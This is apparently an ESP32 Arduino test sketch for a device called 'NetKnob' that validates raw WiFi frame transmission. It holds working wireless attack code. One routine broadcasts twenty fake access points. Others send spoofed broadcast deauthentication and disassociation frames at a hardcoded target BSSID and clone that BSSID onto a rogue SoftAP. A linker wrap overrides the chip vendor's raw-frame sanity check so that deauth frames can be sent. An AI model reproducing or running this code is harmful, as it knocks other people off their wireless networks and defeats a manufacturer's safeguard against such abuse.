// =============================================================================
// NetKnob Spike — WiFi TX Validation
// Validates WiFi TX capabilities before Phase 3 implementation.
// Serial-only. No display, no BLE, no LVGL.
// =============================================================================

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <string.h>

// -----------------------------------------------------------------------------
// Config
// -----------------------------------------------------------------------------

#define SPIKE_CHANNEL          6
#define SPIKE_BEACON_COUNT     20
#define SPIKE_BEACON_DURATION  15000
#define SPIKE_COEXIST_DURATION 10000
#define SPIKE_DEAUTH_COUNT     50
#define SPIKE_DEAUTH_DURATION  5000
#define SPIKE_MEM_TX_COUNT     1000
#define SPIKE_MEM_ROUNDS       3

static const uint8_t TARGET_BSSID[6] = {0x6A, 0x15, 0xA2, 0xAD, 0xBA, 0x10};
#define TARGET_CHANNEL         5

// -----------------------------------------------------------------------------
// SSID Wordlist (20 entries)
// -----------------------------------------------------------------------------

static const char* SSID_LIST[SPIKE_BEACON_COUNT] = {
    "Free WiFi",
    "FBI Surveillance Van",
    "Pretty Fly for a Wi-Fi",
    "Drop It Like Its Hotspot",
    "The LAN Before Time",
    "Wu-Tang LAN",
    "Router I Hardly Know Her",
    "Bill Wi the Science Fi",
    "LAN Solo",
    "The Promised LAN",
    "Nacho WiFi",
    "Get Off My LAN",
    "It Burns When IP",
    "No More Mr Wi-Fi",
    "Silence of the LANs",
    "Loading...",
    "Searching...",
    "Connecting...",
    "Not Your WiFi",
    "Virus Detected"
};

// -----------------------------------------------------------------------------
// Result Tracking
// -----------------------------------------------------------------------------

enum TestResultCode {
    RESULT_NOT_RUN,
    RESULT_PASS,
    RESULT_FAIL,
    RESULT_INCONCLUSIVE,
    RESULT_NOT_AVAILABLE
};

struct SpikeResult {
    TestResultCode  result;
    char            details[64];
};

#define RESULT_BEACON_TX      0
#define RESULT_TXRX_COEXIST   1
#define RESULT_DEAUTH_DIRECT  2
#define RESULT_DEAUTH_ROGUE   3
#define RESULT_DEAUTH_WSL     4
#define RESULT_MEMORY         5
#define RESULT_COUNT          6

static SpikeResult results[RESULT_COUNT];

// -----------------------------------------------------------------------------
// RX Counter — promiscuous callback (registered during wifi_init_sta)
// -----------------------------------------------------------------------------

static volatile uint32_t rx_frame_count = 0;

static void IRAM_ATTR spike_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        rx_frame_count++;
    }
}

// -----------------------------------------------------------------------------
// Forward Declarations
// -----------------------------------------------------------------------------

static void wifi_init_sta();
static const char* result_str(TestResultCode r);
static void print_results();
static void print_menu();
static void run_all();
static void run_test_1_beacon_tx();
static void run_test_2_txrx_coexist();
static void run_test_3_deauth();
static void run_test_3a_direct();
static void run_test_3b_rogue_ap();
static void run_test_3c_wsl();
static void run_test_4_memory();

// -----------------------------------------------------------------------------
// setup()
// -----------------------------------------------------------------------------

void setup() {
    Serial.begin(115200);
    delay(2000); // Give monitor time to connect

    // Initialise all results to NOT_RUN
    for (int i = 0; i < RESULT_COUNT; i++) {
        results[i].result = RESULT_NOT_RUN;
        strncpy(results[i].details, "--", sizeof(results[i].details) - 1);
        results[i].details[sizeof(results[i].details) - 1] = '\0';
    }

    wifi_init_sta();
    print_menu();
}

// -----------------------------------------------------------------------------
// loop()
// -----------------------------------------------------------------------------

void loop() {
    if (!Serial.available()) return;

    char c = Serial.read();

    switch (c) {
        case '1': run_test_1_beacon_tx();    print_menu(); break;
        case '2': run_test_2_txrx_coexist(); print_menu(); break;
        case '3': run_test_3_deauth();       print_menu(); break;
        case '4': run_test_4_memory();       print_menu(); break;
        case '5': run_all();                 print_menu(); break;
        case 'r':
        case 'R': print_results();           print_menu(); break;
        default:  break;
    }
}

// -----------------------------------------------------------------------------
// wifi_init_sta()
// -----------------------------------------------------------------------------

static void wifi_init_sta() {
    Serial.println("[WiFi] Initializing STA + promiscuous mode...");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
    esp_wifi_set_channel(SPIKE_CHANNEL, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[WiFi] Channel: %d\n", SPIKE_CHANNEL);
    Serial.printf("[WiFi] Free heap: %u bytes\n", esp_get_free_heap_size());
    Serial.println("[WiFi] Ready.");
}

// -----------------------------------------------------------------------------
// result_str() helper
// -----------------------------------------------------------------------------

static const char* result_str(TestResultCode r) {
    switch (r) {
        case RESULT_PASS:          return "PASS ";
        case RESULT_FAIL:          return "FAIL ";
        case RESULT_INCONCLUSIVE:  return "INCON";
        case RESULT_NOT_AVAILABLE: return "N/A  ";
        default:                   return " --  ";
    }
}

// -----------------------------------------------------------------------------
// print_results() — formatted table
// -----------------------------------------------------------------------------

static void print_results() {
    Serial.println();
    Serial.println("===========================================");
    Serial.println(" SPIKE RESULTS");
    Serial.println("===========================================");
    Serial.printf(" [%s] 1. Beacon TX         | %s\n",
                  result_str(results[RESULT_BEACON_TX].result),
                  results[RESULT_BEACON_TX].details);
    Serial.printf(" [%s] 2. TX/RX Coexist     | %s\n",
                  result_str(results[RESULT_TXRX_COEXIST].result),
                  results[RESULT_TXRX_COEXIST].details);
    Serial.printf(" [%s] 3a. Deauth Direct    | %s\n",
                  result_str(results[RESULT_DEAUTH_DIRECT].result),
                  results[RESULT_DEAUTH_DIRECT].details);
    Serial.printf(" [%s] 3b. Deauth Rogue AP  | %s\n",
                  result_str(results[RESULT_DEAUTH_ROGUE].result),
                  results[RESULT_DEAUTH_ROGUE].details);
    Serial.printf(" [%s] 3c. Deauth WSL       | %s\n",
                  result_str(results[RESULT_DEAUTH_WSL].result),
                  results[RESULT_DEAUTH_WSL].details);
    Serial.printf(" [%s] 4. Memory / Stress   | %s\n",
                  result_str(results[RESULT_MEMORY].result),
                  results[RESULT_MEMORY].details);
    Serial.println("===========================================");
    Serial.println();
}

// -----------------------------------------------------------------------------
// print_menu()
// -----------------------------------------------------------------------------

static void print_menu() {
    Serial.println();
    Serial.println("===========================================");
    Serial.println(" NetKnob WiFi TX Spike");
    Serial.println("===========================================");
    Serial.println(" 1 - Run Test 1: Beacon TX");
    Serial.println(" 2 - Run Test 2: TX/RX Coexistence");
    Serial.println(" 3 - Run Test 3: Deauth Frames");
    Serial.println(" 4 - Run Test 4: Memory / Stress");
    Serial.println(" 5 - Run All Tests");
    Serial.println(" R - Print Results");
    Serial.println("===========================================");
    Serial.println();
}

// -----------------------------------------------------------------------------
// run_all()
// -----------------------------------------------------------------------------

static void run_all() {
    Serial.println("[Spike] Running all tests...");
    run_test_1_beacon_tx();
    delay(3000);
    run_test_2_txrx_coexist();
    delay(3000);
    run_test_3_deauth();
    delay(3000);
    run_test_4_memory();
    print_results();
}

// -----------------------------------------------------------------------------
// Beacon Frame Builder
// -----------------------------------------------------------------------------

struct BeaconFrame {
    uint8_t  data[128];
    uint8_t  len;
    uint8_t  seq_offset;   // byte offset of sequence control field
    uint16_t seq_num;      // current sequence number
};

static BeaconFrame beacon_frames[SPIKE_BEACON_COUNT];

static void random_mac(uint8_t mac[6]) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
    mac[0] = (mac[0] | 0x02) & 0xFE;  // locally administered, unicast
}

static void build_beacon(BeaconFrame* bf, const char* ssid, uint8_t channel, const uint8_t bssid[6]) {
    uint8_t* p = bf->data;

    // --- MAC Header (24 bytes) ---
    // Frame Control: Beacon (type=0, subtype=8) => 0x80 0x00
    *p++ = 0x80; *p++ = 0x00;
    // Duration
    *p++ = 0x00; *p++ = 0x00;
    // Destination: broadcast
    *p++ = 0xFF; *p++ = 0xFF; *p++ = 0xFF; *p++ = 0xFF; *p++ = 0xFF; *p++ = 0xFF;
    // Source address = BSSID
    memcpy(p, bssid, 6); p += 6;
    // BSSID
    memcpy(p, bssid, 6); p += 6;
    // Sequence Control (will be updated by beacon_next_seq)
    bf->seq_offset = (uint8_t)(p - bf->data);
    *p++ = 0x00; *p++ = 0x00;

    // --- Beacon Body (12 bytes) ---
    // Timestamp (8 bytes, fake zero)
    *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;
    *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;
    // Beacon Interval: 100 TUs = 0x0064, little-endian
    *p++ = 0x64; *p++ = 0x00;
    // Capability Info: ESS + Privacy = 0x3104, little-endian
    *p++ = 0x04; *p++ = 0x31;

    // --- Tag 0: SSID ---
    uint8_t ssid_len = (uint8_t)strnlen(ssid, 32);
    *p++ = 0x00;       // element ID
    *p++ = ssid_len;   // length
    memcpy(p, ssid, ssid_len); p += ssid_len;

    // --- Tag 1: Supported Rates (8 rates) ---
    *p++ = 0x01; *p++ = 0x08;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

    // --- Tag 3: DS Parameter Set (channel) ---
    *p++ = 0x03; *p++ = 0x01;
    *p++ = channel;

    // --- Tag 48: RSN IE (WPA2-PSK / AES / PSK AKM) ---
    // Length = 20 bytes
    *p++ = 0x30; *p++ = 0x14;
    // Version: 1
    *p++ = 0x01; *p++ = 0x00;
    // Group cipher suite: AES (CCMP) 00:0F:AC:04
    *p++ = 0x00; *p++ = 0x0F; *p++ = 0xAC; *p++ = 0x04;
    // Pairwise cipher suite count: 1
    *p++ = 0x01; *p++ = 0x00;
    // Pairwise cipher suite: AES (CCMP) 00:0F:AC:04
    *p++ = 0x00; *p++ = 0x0F; *p++ = 0xAC; *p++ = 0x04;
    // AKM suite count: 1
    *p++ = 0x01; *p++ = 0x00;
    // AKM suite: PSK 00:0F:AC:02
    *p++ = 0x00; *p++ = 0x0F; *p++ = 0xAC; *p++ = 0x02;
    // RSN capabilities: 0x0000
    *p++ = 0x00; *p++ = 0x00;

    bf->len     = (uint8_t)(p - bf->data);
    bf->seq_num = 0;
}

static void beacon_next_seq(BeaconFrame* bf) {
    bf->seq_num++;
    // Sequence control: bits [15:4] = seq_num, bits [3:0] = fragment (0)
    uint16_t sc = (bf->seq_num & 0x0FFF) << 4;
    bf->data[bf->seq_offset]     = (uint8_t)(sc & 0xFF);
    bf->data[bf->seq_offset + 1] = (uint8_t)(sc >> 8);
}

// -----------------------------------------------------------------------------
// Deauth / Disassoc Frame Builders
// -----------------------------------------------------------------------------

static uint8_t deauth_frame[26];

static void build_deauth(const uint8_t dest[6], const uint8_t src_bssid[6], uint8_t reason) {
    deauth_frame[0]  = 0xC0; deauth_frame[1]  = 0x00; // Frame control: deauth
    deauth_frame[2]  = 0x00; deauth_frame[3]  = 0x00; // Duration
    memcpy(&deauth_frame[4],  dest,      6);           // Destination
    memcpy(&deauth_frame[10], src_bssid, 6);           // Source (spoofed)
    memcpy(&deauth_frame[16], src_bssid, 6);           // BSSID (same as source)
    deauth_frame[22] = 0x00; deauth_frame[23] = 0x00; // Seq control
    deauth_frame[24] = reason;                         // Reason code (low byte)
    deauth_frame[25] = 0x00;                           // Reason code (high byte)
}

static uint8_t disassoc_frame[26];

static void build_disassoc(const uint8_t dest[6], const uint8_t src_bssid[6], uint8_t reason) {
    disassoc_frame[0]  = 0xA0; disassoc_frame[1]  = 0x00; // Frame control: disassoc
    disassoc_frame[2]  = 0x00; disassoc_frame[3]  = 0x00; // Duration
    memcpy(&disassoc_frame[4],  dest,      6);             // Destination
    memcpy(&disassoc_frame[10], src_bssid, 6);             // Source (spoofed)
    memcpy(&disassoc_frame[16], src_bssid, 6);             // BSSID (same as source)
    disassoc_frame[22] = 0x00; disassoc_frame[23] = 0x00;  // Seq control
    disassoc_frame[24] = reason;                            // Reason code (low byte)
    disassoc_frame[25] = 0x00;                              // Reason code (high byte)
}

// -----------------------------------------------------------------------------
// Test Implementations
// -----------------------------------------------------------------------------

static void run_test_1_beacon_tx() {
    Serial.println();
    Serial.println("[Test 1] Beacon TX — broadcasting 20 fake APs for 15s");
    Serial.println("[Test 1] Check your phone WiFi list during the test.");
    delay(3000);

    // Build all 20 beacon frames with unique random BSSIDs
    for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
        uint8_t bssid[6];
        random_mac(bssid);
        build_beacon(&beacon_frames[i], SSID_LIST[i], SPIKE_CHANNEL, bssid);
    }

    Serial.println("[Test 1] Frames built. Transmitting...");

    uint32_t ok_count  = 0;
    uint32_t err_count = 0;
    uint32_t start_ms  = millis();

    while (millis() - start_ms < SPIKE_BEACON_DURATION) {
        for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
            beacon_next_seq(&beacon_frames[i]);
            esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA,
                                              beacon_frames[i].data,
                                              beacon_frames[i].len,
                                              false);
            if (ret == ESP_OK) {
                ok_count++;
            } else {
                err_count++;
            }
        }
        delay(100);
    }

    Serial.printf("[Test 1] Done. TX OK: %u  Errors: %u\n", ok_count, err_count);

    if (err_count == 0) {
        results[RESULT_BEACON_TX].result = RESULT_PASS;
        snprintf(results[RESULT_BEACON_TX].details,
                 sizeof(results[RESULT_BEACON_TX].details),
                 "TX OK: %u, Err: 0", ok_count);
    } else {
        results[RESULT_BEACON_TX].result = RESULT_FAIL;
        snprintf(results[RESULT_BEACON_TX].details,
                 sizeof(results[RESULT_BEACON_TX].details),
                 "TX OK: %u, Err: %u", ok_count, err_count);
    }

    Serial.printf("[Test 1] Result: %s | %s\n",
                  result_str(results[RESULT_BEACON_TX].result),
                  results[RESULT_BEACON_TX].details);
}

static void run_test_2_txrx_coexist() {
    Serial.println();
    Serial.println("[Test 2] TX/RX Coexistence — transmitting beacons while counting RX callbacks for 10s");
    Serial.println("[Test 2] Verifies promiscuous RX still fires during heavy TX.");
    delay(3000);

    // Rebuild all 20 beacon frames with fresh random BSSIDs
    for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
        uint8_t bssid[6];
        random_mac(bssid);
        build_beacon(&beacon_frames[i], SSID_LIST[i], SPIKE_CHANNEL, bssid);
    }

    Serial.println("[Test 2] Frames built. Starting TX/RX coexistence test...");

    uint32_t rx_before  = rx_frame_count;
    uint32_t tx_count   = 0;
    uint32_t start_ms   = millis();

    while (millis() - start_ms < SPIKE_COEXIST_DURATION) {
        for (int i = 0; i < SPIKE_BEACON_COUNT; i++) {
            beacon_next_seq(&beacon_frames[i]);
            esp_wifi_80211_tx(WIFI_IF_STA,
                              beacon_frames[i].data,
                              beacon_frames[i].len,
                              false);
            tx_count++;
        }
        delay(50);
    }

    uint32_t rx_after   = rx_frame_count;
    uint32_t rx_delta   = rx_after - rx_before;
    uint32_t rx_rate    = rx_delta / (SPIKE_COEXIST_DURATION / 1000);

    Serial.printf("[Test 2] Done. TX frames: %u  RX callbacks: %u  RX rate: %u/s\n",
                  tx_count, rx_delta, rx_rate);

    if (rx_delta > 0) {
        results[RESULT_TXRX_COEXIST].result = RESULT_PASS;
    } else {
        results[RESULT_TXRX_COEXIST].result = RESULT_FAIL;
    }

    snprintf(results[RESULT_TXRX_COEXIST].details,
             sizeof(results[RESULT_TXRX_COEXIST].details),
             "RX:%u TX:%u RX_rate:%u/s", rx_delta, tx_count, rx_rate);

    Serial.printf("[Test 2] Result: %s | %s\n",
                  result_str(results[RESULT_TXRX_COEXIST].result),
                  results[RESULT_TXRX_COEXIST].details);
}

static void run_test_3a_direct() {
    Serial.println();
    Serial.println("[Test 3a] Deauth Direct — sending deauth frames as STA");

    esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
    delay(100);

    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    build_deauth(broadcast, TARGET_BSSID, 7);

    uint32_t interval_ms = SPIKE_DEAUTH_DURATION / SPIKE_DEAUTH_COUNT;
    if (interval_ms < 10) interval_ms = 10;

    uint32_t ok_count  = 0;
    uint32_t err_count = 0;

    for (int i = 0; i < SPIKE_DEAUTH_COUNT; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (ret == ESP_OK) {
            ok_count++;
        } else {
            err_count++;
        }
        delay(interval_ms);
    }

    Serial.printf("[Test 3a] Done. TX OK: %u  Errors: %u\n", ok_count, err_count);

    if (err_count == 0) {
        results[RESULT_DEAUTH_DIRECT].result = RESULT_PASS;
    } else if (ok_count == 0) {
        results[RESULT_DEAUTH_DIRECT].result = RESULT_FAIL;
    } else {
        results[RESULT_DEAUTH_DIRECT].result = RESULT_INCONCLUSIVE;
    }

    snprintf(results[RESULT_DEAUTH_DIRECT].details,
             sizeof(results[RESULT_DEAUTH_DIRECT].details),
             "TX OK: %u, Err: %u", ok_count, err_count);

    Serial.printf("[Test 3a] Result: %s | %s\n",
                  result_str(results[RESULT_DEAUTH_DIRECT].result),
                  results[RESULT_DEAUTH_DIRECT].details);
}

static void run_test_3b_rogue_ap() {
    Serial.println();
    Serial.println("[Test 3b] Deauth Rogue AP — cloning target BSSID via SoftAP");

    // Disable promiscuous and switch to AP+STA mode
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_AP_STA);
    delay(500);

    // Clone target BSSID onto AP interface
    esp_err_t mac_set_ret = esp_wifi_set_mac(WIFI_IF_AP, (uint8_t*)TARGET_BSSID);
    if (mac_set_ret != ESP_OK) {
        Serial.printf("[Test 3b] MAC set failed: %d\n", mac_set_ret);
        results[RESULT_DEAUTH_ROGUE].result = RESULT_FAIL;
        snprintf(results[RESULT_DEAUTH_ROGUE].details,
                 sizeof(results[RESULT_DEAUTH_ROGUE].details),
                 "MAC spoof failed: %d", mac_set_ret);
        // Tear down and restore
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
        esp_wifi_set_channel(SPIKE_CHANNEL, WIFI_SECOND_CHAN_NONE);
        return;
    }

    // Start SoftAP on target channel
    WiFi.softAP("RogueSpike", nullptr, TARGET_CHANNEL, 0, 1);

    // Verify MAC was applied
    uint8_t actual_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, actual_mac);
    bool mac_matched = (memcmp(actual_mac, TARGET_BSSID, 6) == 0);
    Serial.printf("[Test 3b] MAC spoof %s: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  mac_matched ? "OK" : "MISMATCH",
                  actual_mac[0], actual_mac[1], actual_mac[2],
                  actual_mac[3], actual_mac[4], actual_mac[5]);

    // Re-enable promiscuous
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
    esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);

    // Build and send disassoc frames via AP interface
    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    build_disassoc(broadcast, TARGET_BSSID, 8);

    uint32_t ok_count  = 0;
    uint32_t err_count = 0;

    uint32_t interval_ms = SPIKE_DEAUTH_DURATION / SPIKE_DEAUTH_COUNT;
    if (interval_ms < 10) interval_ms = 10;

    for (int i = 0; i < SPIKE_DEAUTH_COUNT; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        if (ret == ESP_OK) {
            ok_count++;
        } else {
            err_count++;
        }
        delay(interval_ms);
    }

    Serial.printf("[Test 3b] Done. TX OK: %u  Errors: %u\n", ok_count, err_count);

    // Tear down SoftAP, restore STA + promiscuous
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(spike_promisc_cb);
    esp_wifi_set_channel(SPIKE_CHANNEL, WIFI_SECOND_CHAN_NONE);

    if (!mac_matched) {
        results[RESULT_DEAUTH_ROGUE].result = RESULT_FAIL;
        snprintf(results[RESULT_DEAUTH_ROGUE].details,
                 sizeof(results[RESULT_DEAUTH_ROGUE].details),
                 "MAC mismatch, TX OK:%u Err:%u", ok_count, err_count);
    } else if (err_count == 0) {
        results[RESULT_DEAUTH_ROGUE].result = RESULT_PASS;
        snprintf(results[RESULT_DEAUTH_ROGUE].details,
                 sizeof(results[RESULT_DEAUTH_ROGUE].details),
                 "MAC OK, TX OK:%u Err:0", ok_count);
    } else {
        results[RESULT_DEAUTH_ROGUE].result = RESULT_INCONCLUSIVE;
        snprintf(results[RESULT_DEAUTH_ROGUE].details,
                 sizeof(results[RESULT_DEAUTH_ROGUE].details),
                 "MAC OK, TX OK:%u Err:%u", ok_count, err_count);
    }

    Serial.printf("[Test 3b] Result: %s | %s\n",
                  result_str(results[RESULT_DEAUTH_ROGUE].result),
                  results[RESULT_DEAUTH_ROGUE].details);
}

// BYPASS: Wrap the WiFi library's frame type filter via --wrap linker flag.
// The linker redirects all calls to __wrap_ version, original available as __real_.
// Returning 0 = "frame allowed". This enables deauth/disassoc TX.
extern "C" int __real_ieee80211_raw_frame_sanity_check(int32_t arg0, int32_t arg1, int32_t arg2);
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg0, int32_t arg1, int32_t arg2) {
    return 0;  // bypass: allow all frame types
}

static void run_test_3c_wsl() {
    Serial.println();
    Serial.println("[Test 3c] WSL bypass — sanity check overridden, retesting deauth TX");

    // Try deauth frame (0xC0) — same as test 3a but with bypass active
    esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
    delay(100);

    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    build_deauth(broadcast, TARGET_BSSID, 7);

    uint32_t ok_count = 0;
    uint32_t err_count = 0;

    uint32_t interval_ms = SPIKE_DEAUTH_DURATION / SPIKE_DEAUTH_COUNT;
    if (interval_ms < 10) interval_ms = 10;

    for (int i = 0; i < SPIKE_DEAUTH_COUNT; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (ret == ESP_OK) {
            ok_count++;
        } else {
            err_count++;
        }
        delay(interval_ms);
    }

    Serial.printf("[Test 3c] Done. TX OK: %u  Errors: %u\n", ok_count, err_count);

    // Restore channel
    esp_wifi_set_channel(SPIKE_CHANNEL, WIFI_SECOND_CHAN_NONE);

    if (err_count == 0 && ok_count > 0) {
        results[RESULT_DEAUTH_WSL].result = RESULT_PASS;
        snprintf(results[RESULT_DEAUTH_WSL].details,
                 sizeof(results[RESULT_DEAUTH_WSL].details),
                 "BYPASS WORKS! TX OK:%u, deauth sent", ok_count);
    } else if (ok_count > 0) {
        results[RESULT_DEAUTH_WSL].result = RESULT_INCONCLUSIVE;
        snprintf(results[RESULT_DEAUTH_WSL].details,
                 sizeof(results[RESULT_DEAUTH_WSL].details),
                 "partial: TX OK:%u Err:%u", ok_count, err_count);
    } else {
        results[RESULT_DEAUTH_WSL].result = RESULT_FAIL;
        snprintf(results[RESULT_DEAUTH_WSL].details,
                 sizeof(results[RESULT_DEAUTH_WSL].details),
                 "bypass didn't help: TX OK:0 Err:%u", err_count);
    }

    Serial.printf("[Test 3c] Result: %s | %s\n",
                  result_str(results[RESULT_DEAUTH_WSL].result),
                  results[RESULT_DEAUTH_WSL].details);
}

static void run_test_3_deauth() {
    Serial.println();
    Serial.printf("[Test 3] Deauth Frames — target BSSID: %02X:%02X:%02X:%02X:%02X:%02X  channel: %d\n",
                  TARGET_BSSID[0], TARGET_BSSID[1], TARGET_BSSID[2],
                  TARGET_BSSID[3], TARGET_BSSID[4], TARGET_BSSID[5],
                  TARGET_CHANNEL);
    Serial.println("[Test 3] Starting in 3s...");
    delay(3000);

    run_test_3a_direct();
    delay(2000);

    run_test_3b_rogue_ap();
    delay(2000);

    run_test_3c_wsl();

    Serial.println();
    Serial.println("[Test 3] Summary:");
    Serial.printf("  3a Direct:   %s | %s\n",
                  result_str(results[RESULT_DEAUTH_DIRECT].result),
                  results[RESULT_DEAUTH_DIRECT].details);
    Serial.printf("  3b Rogue AP: %s | %s\n",
                  result_str(results[RESULT_DEAUTH_ROGUE].result),
                  results[RESULT_DEAUTH_ROGUE].details);
    Serial.printf("  3c WSL:      %s | %s\n",
                  result_str(results[RESULT_DEAUTH_WSL].result),
                  results[RESULT_DEAUTH_WSL].details);
}

static void run_test_4_memory() {
    Serial.println();
    Serial.println("[Test 4] Memory / Stress — Sending 1000 beacon frames x 3 rounds, measuring heap drift");
    delay(3000);

    // Build a single local beacon frame with random BSSID
    BeaconFrame bf;
    uint8_t bssid[6];
    random_mac(bssid);
    build_beacon(&bf, "MemTest", SPIKE_CHANNEL, bssid);

    uint32_t max_drift    = 0;
    bool     any_failed   = false;

    for (int round = 0; round < SPIKE_MEM_ROUNDS; round++) {
        uint32_t heap_before = esp_get_free_heap_size();

        for (int i = 0; i < SPIKE_MEM_TX_COUNT; i++) {
            beacon_next_seq(&bf);
            esp_wifi_80211_tx(WIFI_IF_STA, bf.data, bf.len, false);
        }

        delay(100); // Let deferred frees settle

        uint32_t heap_after = esp_get_free_heap_size();

        // Drift: positive = memory was lost
        int32_t  drift     = (int32_t)heap_before - (int32_t)heap_after;
        uint32_t abs_drift = (drift < 0) ? (uint32_t)(-drift) : (uint32_t)drift;

        Serial.printf("[Test 4] Round %d: before=%u  after=%u  drift=%+d bytes\n",
                      round + 1, heap_before, heap_after, drift);

        if (abs_drift > max_drift) max_drift = abs_drift;
        if (abs_drift >= 1024)     any_failed = true;
    }

    const uint32_t threshold = 1024;
    Serial.printf("[Test 4] Max drift: %u bytes  Threshold: %u bytes\n", max_drift, threshold);

    if (!any_failed) {
        results[RESULT_MEMORY].result = RESULT_PASS;
    } else {
        results[RESULT_MEMORY].result = RESULT_FAIL;
    }

    snprintf(results[RESULT_MEMORY].details,
             sizeof(results[RESULT_MEMORY].details),
             "max_drift=%u B, %dx%u frames",
             max_drift, SPIKE_MEM_ROUNDS, SPIKE_MEM_TX_COUNT);

    Serial.printf("[Test 4] Result: %s | %s\n",
                  result_str(results[RESULT_MEMORY].result),
                  results[RESULT_MEMORY].details);
}
